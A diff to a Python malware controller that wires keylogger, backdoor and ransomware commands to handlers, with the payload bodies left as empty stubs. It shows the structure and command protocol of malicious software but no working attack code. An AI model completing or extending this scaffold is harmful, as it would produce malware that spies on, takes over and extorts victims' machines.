@@ -45,21 +45,32 @@ def send_keylog_to_attacker():
     reset_keylog_file()
 
 # Opens a backdoor with the attacker's machine
-def start_backdoor():
+def start_backdoor(attacker_ip = None):
+    if type(attacker_ip) == type(None): return
 
     # PLACE CODE HERE...
 
     return
 
 # Closes the backdoor with the attacker's machine
-def stop_backdoor():
+def stop_backdoor(attacker_ip = None):
+    if type(attacker_ip) == type(None): return
 
     # PLACE CODE HERE...
 
     return
 
 # Deploys the ransomware
-def deploy_ransomware():
+def deploy_ransomware(key = None):
+    if type(key) == type(None): return
+
+    # PLACE CODE HERE...
+
+    return
+
+# Deploys the ransomware
+def decrypt_ransomware(key = None):
+    if type(key) == type(None): return
 
     # PLACE CODE HERE...
 
@@ -83,25 +94,29 @@ def main():
         "instructions": instructions.run,
     }
 
-    # first step
+    # First step
     next_step = "privesc"
     result = None
 
     while next_step != "clean":
-        # execute module and get result and next step
+        # Execute module and get result and next step
         result, next_step = modules[next_step]()
-        if result:
-            if result.startswith('keylogger'):
-                if result.endswith('send_log'):
-                    send_keylog_to_attacker()
-                elif result.endswith('reset_log'): reset_keylog_file()
-            
-            elif result.startswith('backdoor'):
-                if result.endswith('start'): start_backdoor()
-                elif result.endswith('stop'): stop_backdoor()
+        result = result.split(' ')
 
-            elif result.startswith('ransomware') and result.endswith('deploy'):
-                deploy_ransomware()
+        if result and len(result) >= 2:
+            if result[0] == 'keylogger':
+                if result[1] == 'send_log': send_keylog_to_attacker()
+                elif result[1] == 'reset_log': reset_keylog_file()
+    
+            elif result[0] == 'backdoor':
+                if len(result) >= 3:
+                    if result[1] == 'start': start_backdoor(attacker_ip = result[2])
+                    elif result[1] == 'stop': stop_backdoor(attacker_ip = result[2])
+
+            elif result[0] == 'ransomware':
+                if len(result) >= 3:
+                    if result[1] == 'deploy': deploy_ransomware(key = result[2])
+                    elif result[1] == 'decrypt': decrypt_ransomware(key = result[2])
 
             if result != 'no_data': reset_instruction()
 
